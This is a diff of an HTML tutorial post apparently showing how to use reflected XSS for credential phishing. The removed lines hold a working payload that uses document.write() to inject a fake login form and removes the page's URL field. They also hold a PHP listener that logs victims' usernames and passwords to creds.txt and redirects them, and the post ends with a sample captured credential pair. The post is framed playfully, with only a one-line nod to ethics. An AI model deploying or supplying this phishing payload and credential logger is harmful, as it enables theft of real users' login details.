@@ -137,22 +137,15 @@
 						Well, well, well! Hold onto your hats because this part is fascinating. Believe it or not, all these modifications can be accomplished using just a simple 
 						<code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1"
 						style="font-size: 16px;">&lt;script&gt;XSS PAYLOAD&lt;/script&gt;</code>.<br>
-						it may jump in your minds that we are talking about stored XSS but, no! Actually its reflected! What does that mean? It means the web page gets infected solely through URL modification. 
+						It may jump in your minds that we are talking about stored XSS but, no! Actually its reflected! What does that mean? It means the web page gets infected solely through URL modification. 
 						There's no storing involved in this game! 🎩🔮</p>
 					<hr>
 					<p class="py-6">
-						Now, let's shine a spotlight on our magical key player here: the JavaScript function document.write(). You might have heard of it before, but have you ever thought about harnessing its 
+						Now, let's shine a spotlight on our magical key player here: the JavaScript function <code style="font-size: 0.7em" class="bg-gray-900 rounded text-white break-words whitespace-pre-wrap p-1">document.write()</code> . You might have heard of it before, but have you ever thought about harnessing its 
 						power from an XSS perspective to pull off such an attack? Well, buckle up, because we're diving right into it! (👍 ͠❛ ͜ʖ ͡❛)👍 <br>
 						Alright, let's break down a typical HTML login form example: <br>
-						<div style="background-color: #1a202c; border-radius: 8px; padding: 16px; max-width: 950px; margin: 0 auto;">
-							<pre style="font-family: 'Fira Code', monospace; font-size: 16px; color: #ffffff; overflow-x: auto; white-space: pre-wrap; word-break: break-word; line-height: 1.5;"><code>	&lt;h3&gt;Please login to continue&lt;/h3&gt;
-	&lt;form action="[URL]"&gt;
-		&lt;input type="username" name="username" placeholder="Username"&gt;
-		&lt;input type="password" name="password" placeholder="Password"&gt;
-		&lt;input type="submit" name="submit" value="Login"&gt;
-	&lt;/form&gt;</code></pre>
-							</div>
-						  
+
+						<script src="https://gist.github.com/0x34ziz/1cd1f8c8fa8fca44cfceb018ef9d5b75.js"></script>
 							
 					</p>
 					
@@ -164,34 +157,22 @@
 					Absolutely, let's weave this web of deception. Imagine sending a URL that injects the following form into the web app, 
 					concealing its original content and displaying only the login page:<br><br>
 
-
-					<div style="background-color: #1a202c; border-radius: 8px; padding: 16px; max-width: 950px; margin: 0 auto;">
-						<pre style="font-family: 'Fira Code', monospace; font-size: 16px; color: #ffffff; overflow-x: auto; white-space: pre-wrap; word-break: break-word; line-height: 1.5;"><code>&lt;script&gt;
-document.write('
-	&lt;h3&gt;Please login to continue
-	&lt;/h3&gt;&lt;form action=[URL]&gt;
-	&lt;input type="username" name="username" placeholder="Username"&gt;
-	&lt;input type="password" name="password" placeholder="Password"&gt;
-	&lt;input type="submit" name="submit" value="Login"&gt;
-	&lt;/form&gt;
-	');
-&lt;/script&gt;</code></pre>
-					</div>
+					<script src="https://gist.github.com/0x34ziz/989fa569d18e68253cf30d9ceb00939a.js"></script>
+				
 					
-					
-					<br>
 
 					This compact piece of code creates the illusion of a login page overlaying the actual web app content. Users might believe they need to log in to 
 					access the site's services. However, it's all a crafty façade, capturing their login details before they're redirected to the 
-					legitimate web app. It's like magic, isn't it?( ͠≖ ͜ʖ ͡≖)<br><br>
-					You're catching on quickly! 😄 Just like you'd normally inject an XSS payload, you can do the same with this crafty login form injection. 
+					legitimate web app.<br> It's like magic, isn't it?( ͠≖ ͜ʖ ͡≖)<br><br>
+					<blockquote class="border-l-4 border-red-700  my-8 pl-8 md:pl-12">You're catching on quickly! 😄 Just like you'd normally inject an XSS payload, you can do the same with this crafty login form injection. 
 					Instead of the usual <code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1"
-					style="font-size: 16px;">&lt;script&gt;alert(1)&lt;/script&gt;</code>.<br>
+					style="font-size: 16px;">&lt;script&gt;alert(1)&lt;/script&gt;</code>.</blockquote><br>
 
 					Hold the phone, you're absolutely right! To make this ruse even more convincing, we've got to clean up the page content. By removing the 
-					URL field, it gives users the impression that logging in is essential to access the page.<br>And you're spot-on with the solution:<br> the 
-					JavaScript function <code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1"
-					style="font-size: 16px;">&lt;script&gt;document.getElementById('urlField').remove()&lt;/script&gt;</code> is our magic wand here.<br><br>
+					URL field, it gives users the impression that logging in is essential to access the page.<br>And you're spot-on with the solution: <code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1 w-full text-xs sm:text-sm md:text-base lg:text-lg">
+						document.getElementById('urlField').remove()
+					</code>
+					<br><br>
 					
 
 					By plugging this snippet into the existing code, you're removing the URL field from the page, making everything look 
@@ -200,20 +181,8 @@ document.write('
 					Now, once we add this code to our previous JavaScript code (after the <code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1"
 					style="font-size: 16px;">&lt;script&gt;document.write()&lt;/script&gt;</code>  function), 
 					we can use this new JavaScript code in our payload:<br><br>
-					<div style="background-color: #1a202c; border-radius: 8px; padding: 16px; max-width: 950px; margin: 0 auto;">
-						<pre style="font-family: 'Fira Code', monospace; font-size: 16px; color: #ffffff; overflow-x: auto; white-space: pre-wrap; word-break: break-word; line-height: 1.5;"><code>&lt;script&gt;
-	document.write('
-		&lt;h3&gt;Please login to continue&lt;/h3&gt;
-		&lt;form action=[URL]&gt;
-		&lt;input type="username" name="username" placeholder="Username"&gt;
-		&lt;input type="password" name="password" placeholder="Password"&gt;
-		&lt;input type="submit" name="submit" value="Login"&gt;
-		&lt;/form&gt;
-		');
-	document.getElementById('urlField').remove();
-&lt;/script&gt;</code></pre>
-					</div>
-					
+
+					<script src="https://gist.github.com/0x34ziz/b3c32d6a3441a2f19ad0634170c07d45.js"></script>
 					
 					  <br>
 					<strong>Time to CLEAN UP!</strong><br>
@@ -224,21 +193,9 @@ document.write('
 					You're bringing all the pieces together to create a seamless trick! Implementing a basic PHP script to listen to the provided server 
 					IP is the cherry on top. This script will log the credentials from the HTTP request and then gracefully redirect the victim back to the original 
 					page without any trace of the 
-					injection. Here's how you might set up that PHP script: <br>
-<br>
-<div style="background-color: #1a202c; border-radius: 8px; padding: 16px; max-width: 950px; margin: 0 auto;">
-	<pre style="font-family: 'Fira Code', monospace; font-size: 16px; color: #ffffff; overflow-x: auto; white-space: pre-wrap; word-break: break-word; line-height: 1.5;">
-	  <code>&lt;?php
-		if (isset($_GET['username']) && isset($_GET['password'])) {
-		  $file = fopen("creds.txt", "a+");
-		  fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
-		  header("Location: http://SERVER_IP/phishing/index.php");
-		  fclose($file);
-		  exit();
-		}
-		?&gt;</code></pre>
-  </div>
-  
+					injection. Here's how you might set up that PHP script: <br><br>
+					
+					<script src="https://gist.github.com/0x34ziz/5dd99cce1562fd7dd1a5bcc2245b817e.js"></script>
 					  
 					<br>With this PHP script, you're capturing the credentials in a log file and then smoothly redirecting the victim back 
 					to the legitimate page. The illusion of successful login is maintained, while you gather the information you need. Your 
@@ -250,13 +207,13 @@ document.write('
 					style="font-size: 16px;">cat creds.txt</code> file – you've just brought your crafted magic trick to life. That captured username and password combo is like the final piece of a puzzle.
 
 					<br>Your attention to detail and strategic thinking has truly transformed this XSS technique into something impressive.<br><br><hr><br> Remember, with great power comes great responsibility, so make sure to use your skills ethically and responsibly! 🎩🔍🔐
-					<br><strong>HOLD ON A SECOND!</strong>
+					<br><br><strong>HOLD ON A SECOND!</strong><br>
 
 					<br><code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1"
 					style="font-size: 16px;">cat creds.txt</code><br>
-(っ ͠° ͜ʖ ͡°)っ <code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1"
+<code class="bg-gray-900 rounded text-white whitespace-no-wrap p-1"
 style="font-size: 16px;">Username: Jake_Richards | Password: J@kKkeEe2023!</code>
-<br><br><br><hr>
+<br>(っ ͠° ͜ʖ ͡°)っ <br><br><br><hr>
 
 								
 				<!--/ Post Content-->
